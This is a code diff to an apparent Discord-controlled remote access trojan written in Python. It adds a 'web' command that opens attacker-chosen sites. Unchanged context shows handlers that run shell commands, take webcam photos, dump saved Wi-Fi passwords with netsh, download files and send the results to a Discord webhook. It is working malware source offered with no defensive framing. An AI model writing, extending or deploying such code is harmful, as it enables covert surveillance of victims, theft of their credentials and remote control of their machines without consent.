@@ -9,6 +9,7 @@ import wmi
 import requests
 import cv2
 import pynput
+import webbrowser
 
 
 TOKEN = ""
@@ -20,15 +21,16 @@ intents.message_content = True
 
 client = discord.Client(intents=intents)
 
-
 @client.event
 async def on_ready():
     print(f'We have logged in as {client.user}')
+
 
 @client.event
 async def on_message(message):
     if message.author == client.user:
         return
+    
 
     if message.content.startswith('command'):
         await message.channel.send('Sent command!')
@@ -39,12 +41,13 @@ async def on_message(message):
         out = out.replace('Ã', '├')
         out = out.replace('Ä', '─')
         print(out)
-
         chunklength = 2000
         chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]
+
         for chunk in chunks: 
             webhook = DiscordWebhook(url=WEBHOOK_URL, content=chunk)
             response = webhook.execute()
+
         
     elif message.content.startswith('cam'):
         cap = cv2.VideoCapture(0)
@@ -52,17 +55,19 @@ async def on_message(message):
         if not cap.isOpened():
             print("Error: Could not open camera.")
             return
+        
         capture_duration = 1
         start_time = time.time()
+
         while (time.time() - start_time) < capture_duration:
             ret, frame = cap.read()
+
             if not ret:
                 print("Error: Failed to capture frame.")
                 break
 
         cv2.imwrite("pic.jpg", frame)
         print("Picture captured successfully as 'captured_picture.jpg'")
-
         cap.release()
         cv2.destroyAllWindows()
         time_now = datetime.datetime.now()
@@ -110,6 +115,7 @@ async def on_message(message):
     elif message.content.startswith('wifi'):
         networks, out = [], ''
         wifis = []
+
         try:
             wifi = subprocess.check_output(
                 ['netsh', 'wlan', 'show', 'profiles'], shell=True,
@@ -117,6 +123,7 @@ async def on_message(message):
             wifi = [i.split(":")[1][1:-1]
                     for i in wifi if "All User Profile" in i]
             wifis = len(networks)
+
             for name in wifi:
                 try:
                     results = subprocess.check_output(
@@ -147,7 +154,6 @@ async def on_message(message):
         response = webhook.execute()
 
 
-        
     elif message.content.startswith('download'):
         command = message.content
         command = command.replace('download ', '')
@@ -169,11 +175,13 @@ async def on_message(message):
             webhook = DiscordWebhook(url=WEBHOOK_URL, content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
             response = webhook.execute()
     
+
     elif message.content.startswith("play"):
         command = message.content
         command = command.replace("play ", "")
         command = command.split()
         url = command[0]
+        
         try:
             wait_time = command[1]
         except IndexError:
@@ -191,5 +199,16 @@ async def on_message(message):
         os.remove("sound.m4a")
         os.system("TASKKILL /F /IM Microsoft.Media.Player.exe")
 
+    elif message.content.startswith("web"):
+        command = message.content
+        command = command.replace("web ", "")
+        site = command
+
+        webhook = DiscordWebhook(url=WEBHOOK_URL, content='Opening website ' + site + '!')
+        response = webhook.execute()
+
+        visit='http://{}'.format(site)
+        webbrowser.open(visit)
+    
 
 client.run(TOKEN)
